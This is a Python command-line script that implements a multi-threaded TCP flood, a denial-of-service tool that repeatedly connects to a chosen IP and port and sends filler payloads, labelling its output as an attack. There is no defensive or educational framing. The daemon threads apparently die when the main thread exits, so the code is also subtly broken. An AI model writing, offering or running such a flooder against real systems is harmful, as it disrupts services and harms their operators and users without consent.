import socket
import threading
import random
import time
import argparse

def tcp_flood(target_ip, target_port, threads, delay):
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                payload = "X" * random.randint(1024, 2048)
                s.send(payload.encode())
                s.close()
            except:
                pass
            time.sleep(delay)

    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()

    print(f"[TCP FLOOD] Attacking {target_ip}:{target_port} with {threads} threads.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("ip", help="Target IP")
    parser.add_argument("port", type=int, help="Target Port")
    parser.add_argument("--threads", type=int, default=100, help="Number of threads")
    parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets")
    args = parser.parse_args()
    tcp_flood(args.ip, args.port, args.threads, args.delay)
